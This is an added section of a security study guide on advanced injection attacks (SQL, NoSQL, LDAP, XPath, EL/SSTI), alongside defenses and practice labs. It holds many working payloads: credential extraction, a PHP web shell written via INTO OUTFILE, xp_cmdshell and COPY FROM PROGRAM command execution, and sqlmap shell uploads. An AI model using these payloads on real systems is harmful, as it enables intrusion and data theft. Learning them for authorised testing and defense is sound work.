@@ -1026,3 +1026,999 @@ docker run -d -p 3000:3000 bkimminich/juice-shop
 
 3. HackTheBox / TryHackMe SQL Injection 챌린지
 ```
+
+---
+
+<a name="english"></a>
+
+# SQL Injection Advanced — Blind, Time-based, NoSQL
+
+## 1. SQL Injection Type Overview
+
+| Type | Response Method | Description |
+|------|-----------------|-------------|
+| Error-based | Error message | Extract data through DB errors |
+| UNION-based | Direct output | Merge other tables using UNION |
+| Blind Boolean | True/False response difference | Page changes based on condition |
+| Blind Time-based | Response delay | Extract data using SLEEP/WAITFOR |
+| Out-of-band | DNS/HTTP request | Exfiltrate data to external server |
+| Stacked queries | Multiple queries | Insert additional queries with `;` |
+
+---
+
+## 2. Blind SQL Injection
+
+### 2-1. Boolean-based Blind
+Exploits differences in responses based on true/false conditions
+
+```sql
+-- Basic check (True → normal page, False → different page)
+' AND 1=1--       (True)
+' AND 1=2--       (False)
+
+-- Find DB name length
+' AND LENGTH(database())=5--    (True if 5 chars)
+' AND LENGTH(database())>4--    (True if greater than 4)
+
+-- Extract DB name character (binary search)
+' AND SUBSTRING(database(),1,1)='a'--
+' AND ASCII(SUBSTRING(database(),1,1))>96--   (True if lowercase)
+' AND ASCII(SUBSTRING(database(),1,1))=109--  (='m')
+
+-- Extract table name
+' AND SUBSTRING(
+    (SELECT table_name FROM information_schema.tables 
+     WHERE table_schema=database() LIMIT 0,1),
+    1,1)='u'--
+
+-- Extract column name
+' AND SUBSTRING(
+    (SELECT column_name FROM information_schema.columns
+     WHERE table_name='users' LIMIT 0,1),
+    1,1)='i'--
+
+-- Extract data
+' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='5'--
+```
+
+### 2-2. Time-based Blind
+Determine True/False through response delay
+
+```sql
+-- MySQL
+' AND SLEEP(5)--                          (always 5 sec delay)
+' AND IF(1=1,SLEEP(5),0)--               (5 sec delay if True)
+' AND IF(LENGTH(database())=5,SLEEP(5),0)--
+
+-- Extract DB name
+' AND IF(ASCII(SUBSTRING(database(),1,1))=109,SLEEP(5),0)--
+
+-- MSSQL
+'; WAITFOR DELAY '0:0:5'--
+'; IF (LEN(DB_NAME())=6) WAITFOR DELAY '0:0:5'--
+
+-- Oracle
+' AND 1=(CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM DUAL WHERE ROWNUM<0) END)--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+
+-- PostgreSQL
+'; SELECT pg_sleep(5)--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+```
+
+---
+
+## 3. Advanced UNION-based Extraction
+
+### 3-1. Determine Column Count
+
+```sql
+-- Find column count using ORDER BY
+' ORDER BY 1--      (success)
+' ORDER BY 2--      (success)
+' ORDER BY 5--      (fail → column count = 4)
+
+-- Verify with UNION
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--   (success → 3 columns)
+```
+
+### 3-2. Determine Data Types
+
+```sql
+-- Find columns that can output strings
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+```
+
+### 3-3. Extract Full DB Info in MySQL
+
+```sql
+-- DB version and user
+' UNION SELECT @@version,@@user(),database()--
+
+-- All databases
+' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--
+
+-- Tables in a specific DB
+' UNION SELECT table_name,NULL,NULL 
+  FROM information_schema.tables 
+  WHERE table_schema='target_db'--
+
+-- Columns in a table
+' UNION SELECT column_name,data_type,NULL 
+  FROM information_schema.columns 
+  WHERE table_name='users'--
+
+-- Multiple columns at once (GROUP_CONCAT)
+' UNION SELECT GROUP_CONCAT(username,':',password),NULL,NULL 
+  FROM users--
+```
+
+### 3-4. File Read/Write (MySQL)
+
+```sql
+-- Read file (requires FILE privilege)
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
+' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--
+
+-- Write web shell (requires write permission + no secure_file_priv)
+' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL, NULL 
+  INTO OUTFILE '/var/www/html/shell.php'--
+```
+
+---
+
+## 4. DBMS Differences
+
+### MySQL
+
+```sql
+-- Comments
+-- comment
+# comment
+/*comment*/
+
+-- String concatenation
+CONCAT('a','b')
+'a' 'b'      (space)
+
+-- Conditional
+IF(condition,true,false)
+SLEEP(5)
+
+-- System tables
+information_schema.tables
+information_schema.columns
+```
+
+### MSSQL (SQL Server)
+
+```sql
+-- Comments
+-- comment
+/*comment*/
+
+-- String concatenation
+'a'+'b'
+
+-- Conditional
+CASE WHEN condition THEN true ELSE false END
+
+-- Delay
+WAITFOR DELAY '0:0:5'
+
+-- System tables
+sys.tables
+sys.columns
+INFORMATION_SCHEMA.TABLES
+
+-- OS command execution (xp_cmdshell)
+EXEC xp_cmdshell 'whoami'
+EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+```
+
+### Oracle
+
+```sql
+-- Comments
+-- comment
+/*comment*/
+
+-- String concatenation
+'a'||'b'
+CONCAT('a','b')
+
+-- NULL row handling (DUAL table)
+' UNION SELECT NULL FROM DUAL--
+
+-- System tables
+all_tables
+all_columns
+user_tables
+
+-- User information
+' UNION SELECT user,NULL FROM dual--
+```
+
+### PostgreSQL
+
+```sql
+-- Comments
+-- comment
+/*comment*/
+
+-- String concatenation
+'a'||'b'
+
+-- Delay
+pg_sleep(5)
+
+-- System catalogs
+pg_catalog.pg_tables
+information_schema.tables
+
+-- OS commands (superuser)
+COPY cmd_exec FROM PROGRAM 'id'
+```
+
+---
+
+## 5. SQLMap Practical Usage
+
+### Basic Usage
+```bash
+# GET parameter
+sqlmap -u "http://target.com/page?id=1"
+
+# POST parameter
+sqlmap -u "http://target.com/login" --data="user=admin&pass=1234"
+
+# Cookie-based
+sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123; id=1"
+
+# Header injection
+sqlmap -u "http://target.com/" -H "X-Forwarded-For: *"
+sqlmap -u "http://target.com/" --user-agent="*"
+```
+
+### Information Gathering
+```bash
+# DB list
+sqlmap -u "http://target.com/?id=1" --dbs
+
+# Table list
+sqlmap -u "http://target.com/?id=1" -D target_db --tables
+
+# Column list
+sqlmap -u "http://target.com/?id=1" -D target_db -T users --columns
+
+# Data dump
+sqlmap -u "http://target.com/?id=1" -D target_db -T users --dump
+
+# Full dump
+sqlmap -u "http://target.com/?id=1" --dump-all
+```
+
+### Advanced Options
+```bash
+# WAF bypass (tamper scripts)
+sqlmap -u "http://target.com/?id=1" --tamper=space2comment
+sqlmap -u "http://target.com/?id=1" --tamper=randomcase,charencode
+sqlmap -u "http://target.com/?id=1" --tamper=between,randomcase,space2comment
+
+# Level/risk adjustment
+sqlmap -u "http://target.com/?id=1" --level=5 --risk=3
+
+# Delay (speed control)
+sqlmap -u "http://target.com/?id=1" --delay=1
+
+# Get OS shell
+sqlmap -u "http://target.com/?id=1" --os-shell
+
+# Upload web shell
+sqlmap -u "http://target.com/?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php
+
+# Burp Suite proxy integration
+sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"
+
+# Use request file (saved from Burp)
+sqlmap -r request.txt
+
+# Include cookie
+sqlmap -r request.txt --cookie="auth=1"
+```
+
+### Tamper Script List
+```
+apostrophemask      ' → %EF%BC%87 (Unicode)
+base64encode        Base64 encoding
+between             Replace > with NOT BETWEEN
+charencode          URL encoding
+chardoubleencode    Double URL encoding
+equaltolike         Replace = with LIKE
+greatest            Replace > with GREATEST()
+htmlencode          HTML encoding
+randomcase          Random mixed case
+space2comment       Replace spaces with /**/
+space2plus          Replace spaces with +
+versionedkeywords   MySQL version comments
+```
+
+---
+
+## 6. WAF Bypass Techniques
+
+### Encoding Bypass
+
+```sql
+-- URL encoding
+' OR 1=1--   →   %27%20OR%201%3D1--
+
+-- Double URL encoding
+%27 → %2527
+
+-- Unicode bypass
+' → %u0027
+UNION → UN%00ION
+
+-- HTML entities
+' → &#39;
+```
+
+### Keyword Bypass
+
+```sql
+-- Insert comments
+UN/**/ION SE/**/LECT
+UNI%00ON
+UNION%20SELECT
+/*!UNION*/ /*!SELECT*/
+
+-- Mixed case
+UnIoN SeLeCt
+uNiOn sElEcT
+
+-- Whitespace bypass
+UNION(SELECT)
+UNION%09SELECT      (tab)
+UNION%0aSELECT      (newline)
+UNION%0dSELECT      (CR)
+
+-- Keyword nesting
+UNUNIONION SESELECTLECT
+```
+
+### Logical Operator Bypass
+
+```sql
+-- AND/OR substitution
+' && 1=1--
+' || 1=1--
+' AND 1=1--    →    '&&1=1--
+' OR 1=1--     →    '||1=1--
+```
+
+---
+
+## 7. Second-Order SQL Injection
+
+Stored in the DB first, then executed when used in another query later
+
+```
+Step 1: Register with username = admin'--
+        → Safely escaped and stored
+
+Step 2: Password change query:
+        UPDATE users SET pw='new' WHERE username='admin'--'
+        → admin'-- is used as username, so:
+          UPDATE users SET pw='new' WHERE username='admin'
+          --' (rest is a comment)
+        → admin account's password is changed!
+```
+
+---
+
+## 8. NoSQL Injection (MongoDB)
+
+### MongoDB Basic Attacks
+```javascript
+// Normal query
+db.users.find({username: "admin", password: "pass"})
+
+// NoSQL Injection (JSON parameter)
+{
+  "username": "admin",
+  "password": {"$gt": ""}    ← $gt (greater than): true for anything > empty string → all passwords pass
+}
+
+// Abuse $where operator
+{"$where": "this.username == 'admin'"}
+{"$where": "sleep(5000)"}   ← Time-based Blind
+{"$where": "function(){return true}"}
+```
+
+### URL Parameter NoSQL Injection
+
+```
+http://target.com/login?username=admin&password[$gt]=
+http://target.com/login?username[$regex]=.*&password[$gt]=
+```
+
+### Blind NoSQL Injection
+
+```javascript
+// Check password length
+{"password": {"$regex": "^.{0,10}$"}}   (True if 10 chars or fewer)
+
+// Extract password characters
+{"password": {"$regex": "^a"}}   (True if starts with 'a')
+{"password": {"$regex": "^ab"}}
+{"password": {"$regex": "^abc"}}
+```
+
+---
+
+## 9. SQL Injection Defenses
+
+### Prepared Statements — The Most Effective Defense
+```php
+// PHP + PDO (vulnerable code)
+$result = $db->query("SELECT * FROM users WHERE id='$id'");
+
+// PHP + PDO (safe code)
+$stmt = $db->prepare("SELECT * FROM users WHERE id=?");
+$stmt->execute([$id]);
+
+// Python + MySQL
+cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+
+// Java + JDBC
+PreparedStatement stmt = conn.prepareStatement(
+    "SELECT * FROM users WHERE id = ?");
+stmt.setString(1, userId);
+```
+
+### Input Validation and Whitelisting
+```python
+#!/usr/bin/env python3
+"""
+requests-based SQL Injection auto-detector
+Supports Boolean-based Blind, Error-based, Time-based detection
+Usage: python3 sqli_detector.py -u "http://target.com/page?id=1"
+        python3 sqli_detector.py -u "http://target.com/login" --post "user=admin&pass=test"
+"""
+import argparse
+import re
+import time
+from dataclasses import dataclass, field
+from typing import Optional
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+import requests
+from requests import Response
+
+
+# ── SQL error patterns (by DB) ───────────────────────────────────────────────────────
+SQL_ERROR_PATTERNS: dict[str, list[str]] = {
+    "MySQL":      [r"you have an error in your sql syntax",
+                   r"warning: mysql_", r"mysql_num_rows\(\)"],
+    "MSSQL":      [r"unclosed quotation mark", r"incorrect syntax near",
+                   r"microsoft ole db provider for sql server"],
+    "PostgreSQL": [r"pg_query\(\):", r"unterminated quoted string",
+                   r"postgresql.*error"],
+    "Oracle":     [r"ora-\d{5}:", r"oracle error", r"quoted string not properly terminated"],
+    "SQLite":     [r"sqlite.*error", r"no such column:", r"unrecognized token:"],
+}
+
+# ── Boolean-based payload pairs ──────────────────────────────────────────
+BOOL_PAYLOADS: list[tuple[str, str]] = [
+    ("' AND '1'='1", "' AND '1'='2"),        # quote-based
+    (" AND 1=1--",   " AND 1=2--"),           # integer-based
+    ("') AND ('1'='1", "') AND ('1'='2"),     # with parentheses
+]
+
+# ── Time-based payloads (by DB) ────────────────────────────────────────────────
+TIME_PAYLOADS: list[str] = [
+    "'; SELECT SLEEP(5)--",                  # MySQL
+    "'; WAITFOR DELAY '0:0:5'--",            # MSSQL
+    "'; SELECT pg_sleep(5)--",               # PostgreSQL
+    "' AND SLEEP(5)--",                      # MySQL (AND)
+    "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", # PostgreSQL (AND)
+]
+
+
+@dataclass
+class ScanResult:
+    url: str
+    param: str
+    method: str
+    vuln_type: str
+    payload: str
+    evidence: str = ""
+    db_type: str = "Unknown"
+
+
+def make_request(
+    session: requests.Session,
+    url: str,
+    method: str,
+    params: dict,
+    timeout: float = 10,
+) -> Optional[Response]:
+    try:
+        if method.upper() == "GET":
+            resp = session.get(url, params=params, timeout=timeout)
+        else:
+            resp = session.post(url, data=params, timeout=timeout)
+        return resp
+    except requests.RequestException:
+        return None
+
+
+def detect_error_based(
+    session: requests.Session,
+    url: str,
+    method: str,
+    base_params: dict,
+    param: str,
+) -> Optional[ScanResult]:
+    """Error message-based detection"""
+    payloads = ["'", '"', "''", "1'", "1\""]
+    for payload in payloads:
+        params = {**base_params, param: base_params.get(param, "") + payload}
+        resp = make_request(session, url, method, params)
+        if resp is None:
+            continue
+        body = resp.text.lower()
+        for db_type, patterns in SQL_ERROR_PATTERNS.items():
+            for pattern in patterns:
+                if re.search(pattern, body, re.IGNORECASE):
+                    return ScanResult(
+                        url=url, param=param, method=method,
+                        vuln_type="Error-based",
+                        payload=payload,
+                        evidence=re.search(pattern, body, re.IGNORECASE).group()[:80],
+                        db_type=db_type,
+                    )
+    return None
+
+
+def detect_boolean_based(
+    session: requests.Session,
+    url: str,
+    method: str,
+    base_params: dict,
+    param: str,
+) -> Optional[ScanResult]:
+    """Boolean-based Blind detection"""
+    original_val = str(base_params.get(param, "1"))
+
+    for true_payload, false_payload in BOOL_PAYLOADS:
+        params_true  = {**base_params, param: original_val + true_payload}
+        params_false = {**base_params, param: original_val + false_payload}
+
+        resp_true  = make_request(session, url, method, params_true)
+        resp_false = make_request(session, url, method, params_false)
+
+        if resp_true is None or resp_false is None:
+            continue
+
+        # Boolean response if length difference > 10%
+        len_true, len_false = len(resp_true.text), len(resp_false.text)
+        if len_true > 0 and abs(len_true - len_false) / len_true > 0.10:
+            return ScanResult(
+                url=url, param=param, method=method,
+                vuln_type="Boolean-based Blind",
+                payload=true_payload,
+                evidence=f"True({len_true}B) vs False({len_false}B) difference",
+            )
+    return None
+
+
+def detect_time_based(
+    session: requests.Session,
+    url: str,
+    method: str,
+    base_params: dict,
+    param: str,
+    threshold: float = 4.5,
+) -> Optional[ScanResult]:
+    """Time-based Blind detection"""
+    for payload in TIME_PAYLOADS:
+        params = {**base_params, param: str(base_params.get(param, "1")) + payload}
+        start = time.monotonic()
+        resp = make_request(session, url, method, params, timeout=15)
+        elapsed = time.monotonic() - start
+        if elapsed >= threshold:
+            db_hint = "MySQL" if "SLEEP" in payload else \
+                      "MSSQL" if "WAITFOR" in payload else "PostgreSQL"
+            return ScanResult(
+                url=url, param=param, method=method,
+                vuln_type="Time-based Blind",
+                payload=payload,
+                evidence=f"Response delayed {elapsed:.1f}s",
+                db_type=db_hint,
+            )
+    return None
+
+
+def scan(
+    url: str,
+    post_data: Optional[str] = None,
+    cookies: Optional[str] = None,
+    headers: Optional[dict] = None,
+    delay: float = 0.3,
+) -> list[ScanResult]:
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0 (SQLi-Detector/2.0)"})
+    if headers:
+        session.headers.update(headers)
+    if cookies:
+        for item in cookies.split(";"):
+            k, _, v = item.strip().partition("=")
+            session.cookies.set(k.strip(), v.strip())
+
+    method = "POST" if post_data else "GET"
+    parsed = urlparse(url)
+
+    if method == "GET":
+        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
+    else:
+        params = dict(pair.split("=", 1) for pair in post_data.split("&") if "=" in pair)
+
+    if not params:
+        print(f"[-] No parameters found: {url}")
+        return []
+
+    results: list[ScanResult] = []
+    for param in params:
+        print(f"[*] Scanning parameter: {param}")
+        for detect_fn in (detect_error_based, detect_boolean_based, detect_time_based):
+            result = detect_fn(session, url, method, params, param)
+            if result:
+                results.append(result)
+                print(f"  [!] {result.vuln_type} found! DB:{result.db_type}  "
+                      f"payload:{result.payload!r}  evidence:{result.evidence}")
+                break  # Move to next parameter after finding one
+        time.sleep(delay)
+
+    return results
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="SQL Injection Auto-Detector")
+    parser.add_argument("-u", "--url", required=True, help="Target URL")
+    parser.add_argument("--post", help="POST data (e.g., user=admin&pass=1)")
+    parser.add_argument("--cookie", help="Cookie string (e.g., session=abc)")
+    parser.add_argument("--header", action="append", default=[],
+                        help="Extra header (e.g., X-Token:abc), can be used multiple times")
+    parser.add_argument("--delay", type=float, default=0.3,
+                        help="Delay between requests (sec) (default: 0.3)")
+    args = parser.parse_args()
+
+    extra_headers = {}
+    for h in args.header:
+        k, _, v = h.partition(":")
+        extra_headers[k.strip()] = v.strip()
+
+    print(f"[*] Starting SQL Injection scan: {args.url}")
+    results = scan(args.url, args.post, args.cookie, extra_headers, args.delay)
+
+    if results:
+        print(f"\n[+] Total {len(results)} vulnerabilities found")
+        for r in results:
+            print(f"  - {r.param} ({r.vuln_type}, {r.db_type})")
+    else:
+        print("\n[-] No vulnerabilities found (manual verification recommended)")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Principle of Least Privilege
+
+```sql
+-- Create dedicated web application account
+CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_pass';
+
+-- Grant only necessary privileges (exclude dangerous ones like FILE, SUPER)
+GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'webapp'@'localhost';
+
+-- Never grant admin privileges
+-- GRANT ALL PRIVILEGES ...  ← Dangerous!
+```
+
+---
+
+## 10. LDAP Injection
+
+### LDAP Basic Structure and Attack Principle
+```
+LDAP filter example:
+(&(uid=admin)(userPassword=secret))
+
+Attack payload — authentication bypass:
+username: admin)(&
+password: anything
+
+Resulting filter:
+(&(uid=admin)(&)(userPassword=anything))
+          → (&) is always True → authentication bypassed!
+```
+
+### LDAP Injection Payloads
+```
+# Authentication bypass
+username: *
+username: admin)(*
+username: *)(uid=*
+
+# Enumerate all users
+username: *)(|(uid=*
+
+# Extract attributes (Blind)
+username: admin)(|(password=a*
+username: admin)(|(password=b*
+→ Extract first character of password from response difference
+```
+
+### LDAP Injection Defense
+
+```java
+// Java: Escape LDAP special characters
+import javax.naming.ldap.LdapName;
+
+String safeDN = Filter.encodeValue(userInput);
+// Special characters: *, (, ), \, NUL → escaped
+
+// Spring Security LDAP
+String query = "(&(uid={0})(objectclass=person))";
+// Automatic escaping applied at {0} position
+```
+
+---
+
+## 11. ORM Injection / Expression Language Injection
+
+### ORM Injection (HQL, JPQL)
+```java
+// Vulnerable Hibernate HQL
+String hql = "FROM User WHERE username = '" + username + "'";
+Query query = session.createQuery(hql);
+
+// Attack:
+// username = ' OR '1'='1
+// username = admin' AND SLEEP(5)--
+
+// Safe code — parameter binding
+Query query = session.createQuery("FROM User WHERE username = :username");
+query.setParameter("username", username);
+```
+
+### Expression Language Injection (EL/OGNL)
+```
+EL Injection test payloads:
+${7*7}        → vulnerable if outputs 49
+#{7*7}        → JSF EL
+*{7*7}        → Spring SpEL
+${java.lang.Runtime.getRuntime().exec('calc')}
+
+OGNL Injection (Struts2):
+%{7*7}
+%{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')}
+
+Server-Side Template Injection (SSTI) similar attacks:
+Jinja2:  {{7*7}}, {{config}}, {{''.__class__.__mro__[1].__subclasses__()}}
+Twig:    {{7*7}}
+FreeMarker: ${7*7}
+Velocity: #set($x=7*7)${x}
+```
+
+### EL/SSTI Detection and Defense
+```bash
+# Detection payload list
+${7*7}
+{{7*7}}
+<%= 7*7 %>
+#{7*7}
+
+# Defense: Never insert user input directly into template strings
+# Jinja2 safe approach
+template = Template("Hello {{ name }}")
+template.render(name=user_input)  # Correct method
+
+# Dangerous approach
+template = Template("Hello " + user_input)  # SSTI possible!
+```
+
+---
+
+## 12. Preventing Mass SQL Injection Exposure
+
+### Bypassing and Defending LIMIT Controls
+
+```sql
+-- Attacker: bypasses LIMIT to extract all data
+' UNION SELECT user, password FROM users LIMIT 1000--
+' UNION SELECT user, password FROM users LIMIT 999999--
+
+-- Extract all at once with GROUP_CONCAT
+' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL FROM users--
+```
+
+```python
+#!/usr/bin/env python3
+"""
+Safe pagination implementation based on SQLAlchemy + Flask
+Prepared Statement + max row limit + Rate Limiting
+"""
+from flask import Flask, request, jsonify, abort
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+from sqlalchemy import text, create_engine
+from sqlalchemy.orm import sessionmaker
+
+app = Flask(__name__)
+engine = create_engine("sqlite:///users.db")
+Session = sessionmaker(bind=engine)
+
+# Rate Limiter (IP-based)
+limiter = Limiter(
+    key_func=get_remote_address,
+    app=app,
+    default_limits=["200 per hour", "20 per minute"],
+    storage_uri="memory://",
+)
+
+MAX_PER_PAGE = 100   # Max rows per page (prevent mass extraction)
+ALLOWED_ORDER_COLS = {"id", "username", "created_at"}  # Whitelist
+
+
+@app.route("/api/users")
+@limiter.limit("30 per minute")  # Per-endpoint limit
+def list_users():
+    # Input validation (type coercion + range limit)
+    try:
+        page     = max(1, int(request.args.get("page", 1)))
+        per_page = min(MAX_PER_PAGE, max(1, int(request.args.get("per_page", 20))))
+    except ValueError:
+        abort(400, "page/per_page must be integers")
+
+    order_by = request.args.get("order_by", "id")
+    if order_by not in ALLOWED_ORDER_COLS:
+        abort(400, f"order_by must be one of {ALLOWED_ORDER_COLS}")
+
+    offset = (page - 1) * per_page
+
+    # Parameter binding with Prepared Statement (SQL Injection defense)
+    # order_by already validated by whitelist, so direct formatting allowed
+    with Session() as session:
+        rows = session.execute(
+            text(f"SELECT id, username, email FROM users "
+                 f"ORDER BY {order_by} "
+                 f"LIMIT :limit OFFSET :offset"),
+            {"limit": per_page, "offset": offset},
+        ).fetchall()
+
+    return jsonify({
+        "page": page,
+        "per_page": per_page,
+        "data": [{"id": r.id, "username": r.username} for r in rows],
+    })
+```
+
+---
+
+## 13. XPath Injection
+
+### XPath Basic Structure and Attack Principle
+```
+XPath is a language for navigating XML documents
+XPath injection occurs in XML-based applications (SOAP services, etc.)
+
+Vulnerable XPath query example:
+  /users/user[username/text()='admin' and password/text()='pass']
+
+Authentication bypass payloads:
+  username: admin' or '1'='1
+  username: ' or 1=1 or '
+  username: admin']/..  (path traversal)
+
+Resulting query:
+  /users/user[username/text()='admin' or '1'='1' and password/text()='...']
+  → Always True → authentication bypassed
+
+Boolean-based Blind XPath:
+  username: admin' and string-length(//user[1]/password)=6 and '1'='1
+  → Guess password length
+
+Character extraction:
+  username: admin' and substring(//user[1]/password,1,1)='a' and '1'='1
+```
+
+### XPath Injection Defense
+```python
+# Python lxml: parameter binding
+from lxml import etree
+
+# Vulnerable approach
+xpath = f"//user[@name='{username}']"
+tree.xpath(xpath)  # Dangerous!
+
+# Safe approach (lxml Extension Functions)
+from lxml.etree import XPath
+query = XPath("//user[@name=$name]")
+result = query(tree, name=username)  # Parameter binding
+
+# Java JAXP
+// No standard for XPath parameter binding, so input escaping is needed
+// Special characters: ' " < > & → escape as XML entities
+```
+
+---
+
+## 14. PostgreSQL-Specific Attack Techniques
+
+```sql
+-- Check PostgreSQL superuser
+SELECT current_user, session_user, pg_is_in_recovery();
+
+-- Read file with pg_read_file() (requires superuser)
+SELECT pg_read_file('/etc/passwd', 0, 1000);
+
+-- Execute OS commands with COPY (PostgreSQL 9.3+)
+CREATE TABLE cmd_output (output text);
+COPY cmd_output FROM PROGRAM 'id';
+SELECT * FROM cmd_output;
+
+-- Upload/download files with lo_import / lo_export
+SELECT lo_import('/tmp/shell.php');
+SELECT lo_export(OID, '/var/www/html/shell.php');
+
+-- Extensions (superuser)
+CREATE EXTENSION IF NOT EXISTS dblink;
+SELECT dblink_exec('host=localhost dbname=postgres', 'SELECT pg_sleep(5)');
+
+-- PostgreSQL version info
+SELECT version();
+SELECT pg_version_num();
+```
+
+---
+
+## 15. SQL Injection Practice Environment
+
+```bash
+# DVWA (Damn Vulnerable Web Application)
+docker run -d -p 80:80 vulnerables/web-dvwa
+
+# SQLi-labs
+docker run -d -p 8080:80 acgpiano/sqli-labs
+
+# WebGoat
+docker run -d -p 8080:8080 webgoat/webgoat
+
+# Juice Shop
+docker run -d -p 3000:3000 bkimminich/juice-shop
+```
+
+### Practice Scenarios
+```
+1. DVWA → SQL Injection section
+   - Security: Low → Manual SQL Injection attack
+   - Security: Medium → GET → POST bypass
+   - Security: High → Session-based bypass
+
+2. SQLi-labs
+   - Less-1 ~ 5: Basic error-based
+   - Less-6 ~ 10: Double quotes
+   - Less-11 ~ 20: POST-based
+   - Less-21 ~ 37: Cookie/header-based
+
+3. HackTheBox / TryHackMe SQL Injection challenges
+```
